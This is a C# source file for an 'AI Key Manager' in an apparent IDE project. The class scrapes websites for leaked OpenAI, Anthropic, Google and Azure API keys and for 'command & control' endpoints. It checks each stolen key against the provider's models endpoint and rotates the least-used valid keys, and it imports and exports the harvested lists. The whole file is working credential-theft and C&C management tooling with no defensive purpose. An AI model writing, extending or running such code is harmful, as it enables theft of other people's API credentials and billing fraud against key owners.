using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.IO;
using System.Text.Json;
using System.Net.Http;
using System.Collections.Concurrent;
using System.Threading;

namespace KimiAppNative.IDE
{
    /// <summary>
    /// AI Key Manager - Manages discovered AI keys and command & control endpoints
    /// Provides functionality to add, validate, organize, and utilize AI resources
    /// </summary>
    public class AIKeyManager
    {
        private readonly AIKeyScrapingEngine _scrapingEngine;
        private readonly ConcurrentDictionary<string, ManagedAIKey> _managedKeys;
        private readonly ConcurrentDictionary<string, ManagedCNCEndpoint> _managedEndpoints;
        private readonly Dictionary<string, AIProvider> _aiProviders;
        private readonly object _managementLock = new object();

        public event EventHandler<KeyAddedEventArgs> KeyAdded;
        public event EventHandler<KeyRemovedEventArgs> KeyRemoved;
        public event EventHandler<EndpointAddedEventArgs> EndpointAdded;
        public event EventHandler<EndpointRemovedEventArgs> EndpointRemoved;

        public AIKeyManager()
        {
            _scrapingEngine = new AIKeyScrapingEngine();
            _managedKeys = new ConcurrentDictionary<string, ManagedAIKey>();
            _managedEndpoints = new ConcurrentDictionary<string, ManagedCNCEndpoint>();
            _aiProviders = new Dictionary<string, AIProvider>();
            
            InitializeAIProviders();
            SetupEventHandlers();
        }

        #region Initialization

        private void InitializeAIProviders()
        {
            _aiProviders["OpenAI"] = new AIProvider
            {
                Name = "OpenAI",
                BaseUrl = "https://api.openai.com/v1",
                Services = new[] { "ChatGPT", "GPT-4", "DALL-E", "Whisper", "Embeddings" },
                KeyFormat = "sk-[48 chars]",
                RateLimits = new Dictionary<string, int>
                {
                    ["requests_per_minute"] = 60,
                    ["tokens_per_minute"] = 150000
                },
                Pricing = new Dictionary<string, decimal>
                {
                    ["gpt-4"] = 0.03m,
                    ["gpt-3.5-turbo"] = 0.002m,
                    ["dall-e-3"] = 0.04m
                }
            };

            _aiProviders["Anthropic"] = new AIProvider
            {
                Name = "Anthropic",
                BaseUrl = "https://api.anthropic.com/v1",
                Services = new[] { "Claude", "Claude-3", "Claude-3.5" },
                KeyFormat = "sk-ant-[95 chars]",
                RateLimits = new Dictionary<string, int>
                {
                    ["requests_per_minute"] = 50,
                    ["tokens_per_minute"] = 100000
                },
                Pricing = new Dictionary<string, decimal>
                {
                    ["claude-3-opus"] = 0.015m,
                    ["claude-3-sonnet"] = 0.003m,
                    ["claude-3-haiku"] = 0.00025m
                }
            };

            _aiProviders["Google"] = new AIProvider
            {
                Name = "Google",
                BaseUrl = "https://generativelanguage.googleapis.com/v1",
                Services = new[] { "Gemini", "PaLM", "Vertex AI" },
                KeyFormat = "AIza[35 chars]",
                RateLimits = new Dictionary<string, int>
                {
                    ["requests_per_minute"] = 100,
                    ["tokens_per_minute"] = 200000
                },
                Pricing = new Dictionary<string, decimal>
                {
                    ["gemini-pro"] = 0.0005m,
                    ["gemini-pro-vision"] = 0.0005m
                }
            };

            _aiProviders["Azure"] = new AIProvider
            {
                Name = "Azure OpenAI",
                BaseUrl = "https://{resource}.openai.azure.com/openai",
                Services = new[] { "GPT-4", "GPT-3.5", "DALL-E", "Embeddings" },
                KeyFormat = "[32 chars]",
                RateLimits = new Dictionary<string, int>
                {
                    ["requests_per_minute"] = 60,
                    ["tokens_per_minute"] = 150000
                },
                Pricing = new Dictionary<string, decimal>
                {
                    ["gpt-4"] = 0.03m,
                    ["gpt-35-turbo"] = 0.002m
                }
            };
        }

        private void SetupEventHandlers()
        {
            _scrapingEngine.KeyDiscovered += OnKeyDiscovered;
            _scrapingEngine.CNCDiscovered += OnCNCDiscovered;
        }

        #endregion

        #region Key Management

        public async Task<string> AddKey(string key, string provider, string service = "", string description = "")
        {
            try
            {
                var managedKey = new ManagedAIKey
                {
                    Id = Guid.NewGuid().ToString(),
                    Key = key,
                    Provider = provider,
                    Service = service,
                    Description = description,
                    AddedAt = DateTime.Now,
                    Status = KeyStatus.Discovered,
                    IsActive = true,
                    UsageCount = 0,
                    LastUsed = null
                };

                // Validate the key
                managedKey.IsValid = await ValidateKey(managedKey);
                managedKey.Status = managedKey.IsValid ? KeyStatus.Valid : KeyStatus.Invalid;

                _managedKeys[managedKey.Id] = managedKey;

                KeyAdded?.Invoke(this, new KeyAddedEventArgs
                {
                    Key = managedKey,
                    Success = true
                });

                Console.WriteLine($"[AI Key Manager] Added {provider} key: {key.Substring(0, Math.Min(8, key.Length))}...");
                return managedKey.Id;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Manager] Error adding key: {ex.Message}");
                return null;
            }
        }

        public async Task<string> AddKeyFromScraping(string sourceUrl)
        {
            try
            {
                Console.WriteLine($"[AI Key Manager] Scraping keys from: {sourceUrl}");
                
                var discoveredKey = await _scrapingEngine.ScrapeWebsiteForKeys(sourceUrl);
                if (discoveredKey != null)
                {
                    return await AddKey(discoveredKey.Key, discoveredKey.Provider, discoveredKey.Service, $"Scraped from {sourceUrl}");
                }
                
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Manager] Error scraping keys: {ex.Message}");
                return null;
            }
        }

        public bool RemoveKey(string keyId)
        {
            try
            {
                if (_managedKeys.TryRemove(keyId, out var removedKey))
                {
                    KeyRemoved?.Invoke(this, new KeyRemovedEventArgs
                    {
                        Key = removedKey,
                        Success = true
                    });

                    Console.WriteLine($"[AI Key Manager] Removed key: {removedKey.Provider}");
                    return true;
                }
                
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Manager] Error removing key: {ex.Message}");
                return false;
            }
        }

        public async Task<bool> ValidateKey(ManagedAIKey key)
        {
            try
            {
                if (!_aiProviders.TryGetValue(key.Provider, out var provider))
                    return false;

                var validationUrl = $"{provider.BaseUrl}/models";
                var request = new HttpRequestMessage(HttpMethod.Get, validationUrl);
                request.Headers.Add("Authorization", $"Bearer {key.Key}");

                var response = await new HttpClient().SendAsync(request);
                
                if (response.IsSuccessStatusCode)
                {
                    key.LastValidated = DateTime.Now;
                    key.ValidationStatus = "Valid";
                    return true;
                }
                else
                {
                    key.ValidationStatus = $"Invalid: {response.StatusCode}";
                    return false;
                }
            }
            catch (Exception ex)
            {
                key.ValidationStatus = $"Error: {ex.Message}";
                return false;
            }
        }

        #endregion

        #region C&C Endpoint Management

        public async Task<string> AddCNCEndpoint(string url, string type, string description = "")
        {
            try
            {
                var managedEndpoint = new ManagedCNCEndpoint
                {
                    Id = Guid.NewGuid().ToString(),
                    Url = url,
                    Type = type,
                    Description = description,
                    AddedAt = DateTime.Now,
                    Status = CNCStatus.Discovered,
                    IsActive = true,
                    UsageCount = 0,
                    LastUsed = null
                };

                // Test the endpoint
                managedEndpoint.IsAccessible = await TestEndpoint(managedEndpoint);
                managedEndpoint.Status = managedEndpoint.IsAccessible ? CNCStatus.Accessible : CNCStatus.Inaccessible;

                _managedEndpoints[managedEndpoint.Id] = managedEndpoint;

                EndpointAdded?.Invoke(this, new EndpointAddedEventArgs
                {
                    Endpoint = managedEndpoint,
                    Success = true
                });

                Console.WriteLine($"[AI Key Manager] Added C&C endpoint: {url}");
                return managedEndpoint.Id;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Manager] Error adding C&C endpoint: {ex.Message}");
                return null;
            }
        }

        public async Task<string> AddCNCEndpointFromScraping(string sourceUrl)
        {
            try
            {
                Console.WriteLine($"[AI Key Manager] Scraping C&C endpoints from: {sourceUrl}");
                
                var discoveredEndpoint = await _scrapingEngine.ScrapeWebsiteForCNC(sourceUrl);
                if (discoveredEndpoint != null)
                {
                    return await AddCNCEndpoint(discoveredEndpoint.Url, discoveredEndpoint.Type.ToString(), discoveredEndpoint.Description);
                }
                
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Manager] Error scraping C&C endpoints: {ex.Message}");
                return null;
            }
        }

        public bool RemoveCNCEndpoint(string endpointId)
        {
            try
            {
                if (_managedEndpoints.TryRemove(endpointId, out var removedEndpoint))
                {
                    EndpointRemoved?.Invoke(this, new EndpointRemovedEventArgs
                    {
                        Endpoint = removedEndpoint,
                        Success = true
                    });

                    Console.WriteLine($"[AI Key Manager] Removed C&C endpoint: {removedEndpoint.Url}");
                    return true;
                }
                
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Manager] Error removing C&C endpoint: {ex.Message}");
                return false;
            }
        }

        private async Task<bool> TestEndpoint(ManagedCNCEndpoint endpoint)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get, endpoint.Url);
                var response = await new HttpClient().SendAsync(request);
                
                if (response.IsSuccessStatusCode)
                {
                    endpoint.LastTested = DateTime.Now;
                    endpoint.TestStatus = "Accessible";
                    return true;
                }
                else
                {
                    endpoint.TestStatus = $"Inaccessible: {response.StatusCode}";
                    return false;
                }
            }
            catch (Exception ex)
            {
                endpoint.TestStatus = $"Error: {ex.Message}";
                return false;
            }
        }

        #endregion

        #region Key and Endpoint Retrieval

        public List<ManagedAIKey> GetActiveKeys()
        {
            return _managedKeys.Values
                .Where(k => k.IsActive && k.IsValid)
                .ToList();
        }

        public List<ManagedAIKey> GetKeysByProvider(string provider)
        {
            return _managedKeys.Values
                .Where(k => k.Provider.Equals(provider, StringComparison.OrdinalIgnoreCase))
                .ToList();
        }

        public ManagedAIKey GetBestKeyForProvider(string provider)
        {
            return _managedKeys.Values
                .Where(k => k.Provider.Equals(provider, StringComparison.OrdinalIgnoreCase) && k.IsActive && k.IsValid)
                .OrderBy(k => k.UsageCount)
                .ThenByDescending(k => k.LastValidated)
                .FirstOrDefault();
        }

        public List<ManagedCNCEndpoint> GetActiveEndpoints()
        {
            return _managedEndpoints.Values
                .Where(e => e.IsActive && e.IsAccessible)
                .ToList();
        }

        public List<ManagedCNCEndpoint> GetEndpointsByType(string type)
        {
            return _managedEndpoints.Values
                .Where(e => e.Type.Equals(type, StringComparison.OrdinalIgnoreCase))
                .ToList();
        }

        public ManagedCNCEndpoint GetBestEndpointForType(string type)
        {
            return _managedEndpoints.Values
                .Where(e => e.Type.Equals(type, StringComparison.OrdinalIgnoreCase) && e.IsActive && e.IsAccessible)
                .OrderBy(e => e.UsageCount)
                .ThenByDescending(e => e.LastTested)
                .FirstOrDefault();
        }

        #endregion

        #region Usage Tracking

        public void RecordKeyUsage(string keyId)
        {
            if (_managedKeys.TryGetValue(keyId, out var key))
            {
                key.UsageCount++;
                key.LastUsed = DateTime.Now;
            }
        }

        public void RecordEndpointUsage(string endpointId)
        {
            if (_managedEndpoints.TryGetValue(endpointId, out var endpoint))
            {
                endpoint.UsageCount++;
                endpoint.LastUsed = DateTime.Now;
            }
        }

        #endregion

        #region Bulk Operations

        public async Task<string> StartBulkScrapingSession(string sessionName, string[] targetUrls)
        {
            var targets = targetUrls.Select(url => new ScrapingTarget
            {
                Name = $"Target: {url}",
                Url = url,
                Description = $"Scraping {url} for AI keys and C&C endpoints",
                Status = ScrapingTargetStatus.Pending
            }).ToArray();

            return await _scrapingEngine.StartKeyScrapingSession(sessionName, targets);
        }

        public async Task ImportKeysFromFile(string filePath)
        {
            try
            {
                var json = await File.ReadAllTextAsync(filePath);
                var keys = JsonSerializer.Deserialize<List<DiscoveredAIKey>>(json);
                
                foreach (var key in keys)
                {
                    await AddKey(key.Key, key.Provider, key.Service, $"Imported from {filePath}");
                }
                
                Console.WriteLine($"[AI Key Manager] Imported {keys.Count} keys from {filePath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Manager] Error importing keys: {ex.Message}");
            }
        }

        public async Task ImportCNCFromFile(string filePath)
        {
            try
            {
                var json = await File.ReadAllTextAsync(filePath);
                var endpoints = JsonSerializer.Deserialize<List<CommandControlEndpoint>>(json);
                
                foreach (var endpoint in endpoints)
                {
                    await AddCNCEndpoint(endpoint.Url, endpoint.Type.ToString(), endpoint.Description);
                }
                
                Console.WriteLine($"[AI Key Manager] Imported {endpoints.Count} C&C endpoints from {filePath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Manager] Error importing C&C endpoints: {ex.Message}");
            }
        }

        public async Task ExportKeysToFile(string filePath)
        {
            try
            {
                var keysData = _managedKeys.Values.Select(k => new
                {
                    k.Id,
                    k.Key,
                    k.Provider,
                    k.Service,
                    k.Description,
                    k.AddedAt,
                    k.IsValid,
                    k.Status,
                    k.UsageCount,
                    k.LastUsed
                }).ToList();
                
                var json = JsonSerializer.Serialize(keysData, new JsonSerializerOptions { WriteIndented = true });
                await File.WriteAllTextAsync(filePath, json);
                
                Console.WriteLine($"[AI Key Manager] Exported {keysData.Count} managed keys to {filePath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Manager] Error exporting keys: {ex.Message}");
            }
        }

        public async Task ExportCNCToFile(string filePath)
        {
            try
            {
                var endpointsData = _managedEndpoints.Values.Select(e => new
                {
                    e.Id,
                    e.Url,
                    e.Type,
                    e.Description,
                    e.AddedAt,
                    e.IsAccessible,
                    e.Status,
                    e.UsageCount,
                    e.LastUsed
                }).ToList();
                
                var json = JsonSerializer.Serialize(endpointsData, new JsonSerializerOptions { WriteIndented = true });
                await File.WriteAllTextAsync(filePath, json);
                
                Console.WriteLine($"[AI Key Manager] Exported {endpointsData.Count} managed C&C endpoints to {filePath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Manager] Error exporting C&C endpoints: {ex.Message}");
            }
        }

        #endregion

        #region Event Handlers

        private void OnKeyDiscovered(object sender, KeyDiscoveredEventArgs e)
        {
            if (e.Success)
            {
                _ = Task.Run(async () =>
                {
                    await AddKey(e.Key.Key, e.Key.Provider, e.Key.Service, $"Auto-discovered from {e.Key.SourceUrl}");
                });
            }
        }

        private void OnCNCDiscovered(object sender, CNCDiscoveredEventArgs e)
        {
            if (e.Success)
            {
                _ = Task.Run(async () =>
                {
                    await AddCNCEndpoint(e.Endpoint.Url, e.Endpoint.Type.ToString(), $"Auto-discovered from {e.Endpoint.SourceUrl}");
                });
            }
        }

        #endregion

        #region Statistics and Reporting

        public Dictionary<string, object> GetManagementStats()
        {
            return new Dictionary<string, object>
            {
                ["TotalManagedKeys"] = _managedKeys.Count,
                ["ActiveKeys"] = _managedKeys.Values.Count(k => k.IsActive),
                ["ValidKeys"] = _managedKeys.Values.Count(k => k.IsValid),
                ["KeysByProvider"] = _managedKeys.Values
                    .GroupBy(k => k.Provider)
                    .ToDictionary(g => g.Key, g => g.Count()),
                ["TotalManagedEndpoints"] = _managedEndpoints.Count,
                ["ActiveEndpoints"] = _managedEndpoints.Values.Count(e => e.IsActive),
                ["AccessibleEndpoints"] = _managedEndpoints.Values.Count(e => e.IsAccessible),
                ["EndpointsByType"] = _managedEndpoints.Values
                    .GroupBy(e => e.Type)
                    .ToDictionary(g => g.Key, g => g.Count()),
                ["MostUsedKey"] = _managedKeys.Values
                    .OrderByDescending(k => k.UsageCount)
                    .FirstOrDefault()?.Provider,
                ["MostUsedEndpoint"] = _managedEndpoints.Values
                    .OrderByDescending(e => e.UsageCount)
                    .FirstOrDefault()?.Type
            };
        }

        public List<ManagedAIKey> GetTopUsedKeys(int count = 10)
        {
            return _managedKeys.Values
                .OrderByDescending(k => k.UsageCount)
                .Take(count)
                .ToList();
        }

        public List<ManagedCNCEndpoint> GetTopUsedEndpoints(int count = 10)
        {
            return _managedEndpoints.Values
                .OrderByDescending(e => e.UsageCount)
                .Take(count)
                .ToList();
        }

        #endregion
    }

    #region Supporting Classes

    public class AIProvider
    {
        public string Name { get; set; }
        public string BaseUrl { get; set; }
        public string[] Services { get; set; }
        public string KeyFormat { get; set; }
        public Dictionary<string, int> RateLimits { get; set; }
        public Dictionary<string, decimal> Pricing { get; set; }
    }

    public class ManagedAIKey
    {
        public string Id { get; set; }
        public string Key { get; set; }
        public string Provider { get; set; }
        public string Service { get; set; }
        public string Description { get; set; }
        public DateTime AddedAt { get; set; }
        public KeyStatus Status { get; set; }
        public bool IsActive { get; set; }
        public bool IsValid { get; set; }
        public string ValidationStatus { get; set; }
        public DateTime? LastValidated { get; set; }
        public int UsageCount { get; set; }
        public DateTime? LastUsed { get; set; }
    }

    public class ManagedCNCEndpoint
    {
        public string Id { get; set; }
        public string Url { get; set; }
        public string Type { get; set; }
        public string Description { get; set; }
        public DateTime AddedAt { get; set; }
        public CNCStatus Status { get; set; }
        public bool IsActive { get; set; }
        public bool IsAccessible { get; set; }
        public string TestStatus { get; set; }
        public DateTime? LastTested { get; set; }
        public int UsageCount { get; set; }
        public DateTime? LastUsed { get; set; }
    }

    public class KeyAddedEventArgs : EventArgs
    {
        public ManagedAIKey Key { get; set; }
        public bool Success { get; set; }
        public string Error { get; set; }
    }

    public class KeyRemovedEventArgs : EventArgs
    {
        public ManagedAIKey Key { get; set; }
        public bool Success { get; set; }
        public string Error { get; set; }
    }

    public class EndpointAddedEventArgs : EventArgs
    {
        public ManagedCNCEndpoint Endpoint { get; set; }
        public bool Success { get; set; }
        public string Error { get; set; }
    }

    public class EndpointRemovedEventArgs : EventArgs
    {
        public ManagedCNCEndpoint Endpoint { get; set; }
        public bool Success { get; set; }
        public string Error { get; set; }
    }

    #endregion
}
